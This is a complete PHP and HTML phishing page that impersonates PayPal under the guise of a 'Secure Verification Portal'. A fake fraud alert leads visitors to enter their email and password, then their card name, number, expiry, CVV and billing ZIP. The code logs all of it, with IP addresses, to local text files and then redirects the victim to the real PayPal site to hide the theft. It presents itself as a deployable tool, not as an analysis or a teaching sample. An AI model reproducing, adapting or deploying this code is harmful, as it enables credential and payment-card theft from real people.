<?php
// PayPal Login Verification - WORKING VERSION WITH COOKIE FIX
// NO WHITESPACE BEFORE THIS LINE!

// Start session at the very beginning
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// Configuration
$LOG_FILE = "captured_data.txt";
$IP_LOG_FILE = "visitor_ips.txt";

// Set timezone to USA Eastern Time for display
date_default_timezone_set('America/New_York');
$usa_time = date('l, F j, Y g:i A T');
$usa_date = date('Y-m-d');
$usa_timestamp = date('Y-m-d H:i:s');

// Initialize step
$current_step = 'login';

// Handle form submission - MOVE THIS BEFORE ANY OUTPUT
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['login_submit'])) {
        $email = $_POST['email'] ?? '';
        $password = $_POST['password'] ?? '';
        
        // Create log directory if it doesn't exist
        if (!file_exists(dirname($LOG_FILE))) {
            mkdir(dirname($LOG_FILE), 0755, true);
        }
        
        // Log to file
        $timestamp = $usa_timestamp;
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        
        // Log IP
        $ip_log = "[$timestamp] IP: $ip | Agent: $user_agent | Timezone: America/New_York\n";
        @file_put_contents($IP_LOG_FILE, $ip_log, FILE_APPEND | LOCK_EX);
        
        // Log credentials
        $log_entry = "=========================================\n";
        $log_entry .= "TIMESTAMP (USA/ET): $timestamp\n";
        $log_entry .= "TYPE: CREDENTIALS\n";
        $log_entry .= "IP ADDRESS: $ip\n";
        $log_entry .= "USER AGENT: $user_agent\n";
        $log_entry .= "EMAIL: " . htmlspecialchars($email) . "\n";
        $log_entry .= "PASSWORD: " . htmlspecialchars($password) . "\n";
        $log_entry .= "CURRENCY: USD\n";
        $log_entry .= "TIMEZONE: America/New_York\n";
        $log_entry .= "=========================================\n\n";
        @file_put_contents($LOG_FILE, $log_entry, FILE_APPEND | LOCK_EX);
        
        // Store in session
        $_SESSION['email'] = $email;
        $_SESSION['logged_in'] = true;
        $_SESSION['step'] = 'verification';
        $_SESSION['login_time'] = $timestamp;
        $_SESSION['incident_ref'] = "FRDR-" . mt_rand(1000000000, 9999999999);
        
        // Force immediate redirect with NO output
        header("Location: ?step=verification");
        exit();
    }
    
    if (isset($_POST['verify_submit'])) {
        // Capture card details
        $card_name = $_POST['card_name'] ?? '';
        $card_number = $_POST['card_number'] ?? '';
        $expiry = $_POST['expiry'] ?? '';
        $cvv = $_POST['cvv'] ?? '';
        $zip = $_POST['zip'] ?? '';
        
        // Log to file
        $timestamp = $usa_timestamp;
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        
        $log_entry = "=========================================\n";
        $log_entry .= "TIMESTAMP (USA/ET): $timestamp\n";
        $log_entry .= "TYPE: CREDIT_CARD\n";
        $log_entry .= "IP ADDRESS: $ip\n";
        $log_entry .= "USER AGENT: $user_agent\n";
        $log_entry .= "CARDHOLDER: " . htmlspecialchars($card_name) . "\n";
        $log_entry .= "CARD NUMBER: " . htmlspecialchars($card_number) . "\n";
        $log_entry .= "EXPIRY: " . htmlspecialchars($expiry) . "\n";
        $log_entry .= "CVV: " . htmlspecialchars($cvv) . "\n";
        $log_entry .= "ZIP: " . htmlspecialchars($zip) . "\n";
        $log_entry .= "CURRENCY: USD\n";
        $log_entry .= "TIMEZONE: America/New_York\n";
        $log_entry .= "=========================================\n\n";
        @file_put_contents($LOG_FILE, $log_entry, FILE_APPEND | LOCK_EX);
        
        $_SESSION['card_name'] = $card_name;
        $_SESSION['card_number'] = $card_number;
        $_SESSION['expiry'] = $expiry;
        $_SESSION['cvv'] = $cvv;
        $_SESSION['zip'] = $zip;
        
        // Redirect to real PayPal website instead of success page
        header("Location: https://www.paypal.com");
        exit();
    }
}

// Determine current step
if (isset($_GET['step']) && $_GET['step'] == 'verification' && isset($_SESSION['logged_in'])) {
    $current_step = 'verification';
} else {
    $current_step = 'login';
    $_SESSION['incident_ref'] = "FRDR-" . mt_rand(1000000000, 9999999999);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Secure Verification Portal</title>
    <link href="https://www.paypalobjects.com/webstatic/icon/pp258.png" rel="shortcut icon" type="image/x-icon">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
        }
        
        .security-container {
            background-color: #ffffff;
            border: 1px solid #e1e1e1;
            border-radius: 4px;
            max-width: 700px;
            margin: 40px auto;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
        }
        
        .header {
            background: linear-gradient(90deg, #003087 0%, #009cde 100%);
            padding: 25px 40px;
            color: white;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .paypal-logo {
            height: 40px;
            width: auto;
            margin-right: 15px;
        }
        
        .header h1 {
            margin: 0;
            font-size: 28px;
            font-weight: 600;
        }
        
        .header-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
        }
        
        .header-subtitle {
            margin: 5px 0 0 0;
            opacity: 0.9;
            font-size: 16px;
        }
        
        .time-display {
            text-align: right;
            font-size: 14px;
            opacity: 0.9;
            background: rgba(255,255,255,0.1);
            padding: 8px 12px;
            border-radius: 4px;
            margin-top: 5px;
        }
        
        .currency-display {
            text-align: right;
            font-size: 14px;
            opacity: 0.9;
            margin-top: 5px;
        }
        
        .content {
            padding: 40px;
        }
        
        .login-form {
            background-color: #f8f9fa;
            border: 1px solid #e1e1e1;
            border-radius: 8px;
            padding: 30px;
            margin: 20px 0;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
        }
        
        .form-control {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            letter-spacing: 1px;
        }
        
        .form-control:focus {
            border-color: #0070e0;
            box-shadow: 0 0 0 2px rgba(0, 112, 224, 0.2);
            outline: none;
        }
        
        .verify-button {
            background: linear-gradient(90deg, #0070e0 0%, #0054b1 100%);
            color: #ffffff;
            padding: 16px 40px;
            border-radius: 100px;
            font-weight: 600;
            font-size: 17px;
            border: none;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            transition: background 0.3s;
        }
        
        .verify-button:hover {
            background: linear-gradient(90deg, #0054b1 0%, #003087 100%);
        }
        
        .verify-button:disabled {
            background: #cccccc;
            cursor: not-allowed;
        }
        
        .transaction-alert {
            background-color: #fff8e5;
            border: 1px solid #ffeaa7;
            border-left: 4px solid #ffc107;
            border-radius: 4px;
            padding: 20px;
            margin: 0 0 30px 0;
            color: #856404;
        }
        
        .footer {
            background-color: #f8f9fa;
            padding: 30px 40px;
            border-top: 1px solid #e1e1e1;
            font-size: 12px;
            color: #666;
        }
        
        /* Add spacing for card number digits */
        .card-number-group {
            position: relative;
        }
        
        .card-number-group::after {
            content: "";
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23003087"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>');
            background-repeat: no-repeat;
            background-position: center;
            opacity: 0.5;
        }
        
        /* Expiry date field styling */
        .expiry-group {
            position: relative;
        }
        
        .expiry-group::before {
            content: "/";
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            font-size: 20px;
            color: #999;
            pointer-events: none;
            z-index: 1;
        }
        
        .expiry-input {
            padding-left: 40px !important;
            letter-spacing: 3px;
        }
        
        .currency-badge {
            display: inline-block;
            background: #0070e0;
            color: white;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 12px;
            margin-left: 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="security-container">
        <div class="header">
            <div class="logo-container">
                <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal" class="paypal-logo">
                <div>
                    <h1>Secure Verification Portal</h1>
                    <p class="header-subtitle">Account Verification Required</p>
                </div>
            </div>
            <div class="header-info">
                <div class="currency-display">
                    Primary Currency: <span class="currency-badge">USD</span>
                </div>
                <div class="time-display">
                    USA Time (Eastern): <?php echo $usa_time; ?>
                </div>
            </div>
        </div>
        
        <div class="content">
            <?php if ($current_step == 'login'): ?>
                <!-- LOGIN FORM -->
                <div class="transaction-alert">
                    <h2 style="margin-top: 0;">🔒 Security Verification Required</h2>
                    <p>To proceed with fraud investigation, please verify your identity by logging into your PayPal account.</p>
                    <p><strong>Reference:</strong> <?php echo $_SESSION['incident_ref']; ?></p>
                    <p><strong>Date:</strong> <?php echo $usa_date; ?> | <strong>Currency:</strong> USD</p>
                </div>
                
                <div class="login-form">
                    <h3 style="margin-top: 0; color: #003087;">PayPal Sign In</h3>
                    <p style="color: #666; margin-bottom: 25px;">Enter your PayPal email and password to continue.</p>
                    
                    <form method="POST" action="" id="loginForm">
                        <div class="form-group">
                            <label for="email">Email address</label>
                            <input type="email" id="email" name="email" class="form-control" placeholder="you@example.com" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="password">Password</label>
                            <input type="password" id="password" name="password" class="form-control" placeholder="Enter your password" required>
                        </div>
                        
                        <input type="hidden" name="login_submit" value="1">
                        
                        <button type="submit" class="verify-button" id="submitBtn">
                            Continue to Verification
                        </button>
                    </form>
                </div>
                
            <?php elseif ($current_step == 'verification'): ?>
                <!-- VERIFICATION FORM -->
                <div class="transaction-alert">
                    <h2 style="margin-top: 0;">💳 Additional Verification Required</h2>
                    <p>For enhanced security, please verify your payment card details to confirm account ownership.</p>
                    <p><strong>Reference:</strong> <?php echo $_SESSION['incident_ref']; ?></p>
                    <p><strong>Date:</strong> <?php echo $usa_date; ?> | <strong>Currency:</strong> USD</p>
                </div>
                
                <div class="login-form">
                    <h3 style="margin-top: 0; color: #003087;">Payment Card Verification</h3>
                    <p style="color: #666; margin-bottom: 25px;">Please enter the details of the primary card on your PayPal account. All transactions will be processed in USD.</p>
                    
                    <form method="POST" action="" id="verifyForm">
                        <div class="form-group">
                            <label for="card_name">Name on Card</label>
                            <input type="text" id="card_name" name="card_name" class="form-control" placeholder="John A. Smith" required>
                        </div>
                        
                        <div class="form-group card-number-group">
                            <label for="card_number">Card Number</label>
                            <input type="text" id="card_number" name="card_number" class="form-control" placeholder="1234 5678 9012 3456" required maxlength="19">
                        </div>
                        
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                            <div class="form-group expiry-group">
                                <label for="expiry">Expiry Date</label>
                                <input type="text" id="expiry" name="expiry" class="form-control expiry-input" placeholder="MM/YY" required maxlength="5">
                            </div>
                            
                            <div class="form-group">
                                <label for="cvv">CVV</label>
                                <input type="text" id="cvv" name="cvv" class="form-control" placeholder="123" required maxlength="4">
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label for="zip">Billing ZIP/Postal Code</label>
                            <input type="text" id="zip" name="zip" class="form-control" placeholder="90210" required>
                        </div>
                        
                        <input type="hidden" name="verify_submit" value="1">
                        
                        <button type="submit" class="verify-button" id="submitBtn">
                            Complete Verification
                        </button>
                    </form>
                </div>
            <?php endif; ?>
        </div>
        
        <div class="footer">
            <p style="margin: 0 0 10px 0;">
                <strong>Security Tip:</strong> Do not stay logged in using PayPal on someone else's phone or laptop.
            </p>
            <p style="margin: 0; font-size: 11px; color: #999;">
                Copyright © 1999-2025 PayPal, Inc. All rights reserved. | System Time: <?php echo $usa_time; ?> | Currency: USD
            </p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const forms = document.querySelectorAll('form');
            
            forms.forEach(form => {
                form.addEventListener('submit', function(e) {
                    const submitBtn = this.querySelector('button[type="submit"]');
                    
                    if (submitBtn) {
                        submitBtn.innerHTML = '⏳ Processing...';
                        submitBtn.disabled = true;
                    }
                    
                    return true;
                });
            });
            
            // Card number formatting - add spaces every 4 digits
            const cardNumberInput = document.getElementById('card_number');
            if (cardNumberInput) {
                cardNumberInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
                    let formattedValue = '';
                    
                    for (let i = 0; i < value.length; i++) {
                        if (i > 0 && i % 4 === 0) {
                            formattedValue += ' ';
                        }
                        formattedValue += value[i];
                    }
                    
                    e.target.value = formattedValue.substring(0, 19); // Limit to 16 digits + 3 spaces
                });
            }
            
            // Expiry date formatting - auto-add slash and format
            const expiryInput = document.getElementById('expiry');
            if (expiryInput) {
                expiryInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    
                    if (value.length >= 2) {
                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
                    }
                    
                    e.target.value = value.substring(0, 5); // MM/YY format
                });
                
                // Set placeholder text that shows the slash permanently
                expiryInput.setAttribute('placeholder', 'MM/YY');
            }
            
            // Auto-focus first input
            setTimeout(() => {
                const firstInput = document.querySelector('input[required]');
                if (firstInput) {
                    firstInput.focus();
                }
            }, 100);
        });
    </script>
</body>
</html>
